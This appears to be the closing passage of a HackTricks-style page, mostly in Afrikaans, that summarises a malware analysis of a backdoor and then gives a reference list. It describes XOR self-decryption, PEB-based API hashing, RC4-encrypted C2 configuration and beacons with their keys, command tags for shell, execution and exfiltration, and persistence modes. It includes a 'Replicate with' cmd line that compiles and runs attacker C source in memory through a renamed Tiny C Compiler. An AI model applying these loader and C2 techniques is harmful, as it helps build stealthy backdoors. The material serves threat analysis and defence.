- Deksrypteer 'n PE-agtige hoofmodule deur add/XOR/sub met sleutel `gQ2JR&9;` oor vyf passe te herhaal, laai dan dinamies `Kernel32.dll` → `GetProcAddress` om die import-resolusie te voltooi.
- Herbou DLL-naamstringe tydens runtime deur per-teken bit-rotate/XOR transformasies, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik 'n tweede resolver wat die **PEB → InMemoryOrderModuleList** deurloop, elke exporttabel in 4-byte blokke ontleed met Murmur-styl menging, en slegs terugval na `GetProcAddress` as die hash nie gevind word nie.

Embedded configuration & C2
- Konfigurasie lê binne die gelaaide `BluetoothService` lêer by **offset 0x30808** (grootte **0x980**) en word RC4-ontsleutel met sleutel `qwhvb^435h&*7`, wat die C2 URL en User-Agent openbaar.
- Beacons bou 'n punt-geskeide host-profiel, voeg tag `4Q` voorop, dan RC4-enkripteer met sleutel `vAuig34%^325hGV` voor `HttpSendRequestA` oor HTTPS. Antwoorde word RC4-ontsleutel en versprei deur 'n tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Uitvoeringsmodus word bepaal deur CLI-args: geen args = installeer persistence (service/Run key) wat na `-i` wys; `-i` herbegin self met `-k`; `-k` slaan installasie oor en voer die payload uit.

Alternate loader observed
- Dieselfde intrusie het Tiny C Compiler laat val en `svchost.exe -nostdlib -run conf.c` vanaf `C:\ProgramData\USOShared\` uitgevoer, met `libtcc.dll` langs dit. Die aanvaller-gelewerde C-bron het shellcode ingebed, gekompileer, en in-geheue gedraai sonder om die skyf met 'n PE aan te raak. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hierdie TCC-based compile-and-run stage het `Wininet.dll` by runtime geïmporteer en 'n second-stage shellcode van 'n hardcoded URL afgelaai, wat 'n buigsame loader verskaf wat as 'n compiler run voorgee.

## Verwysings

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
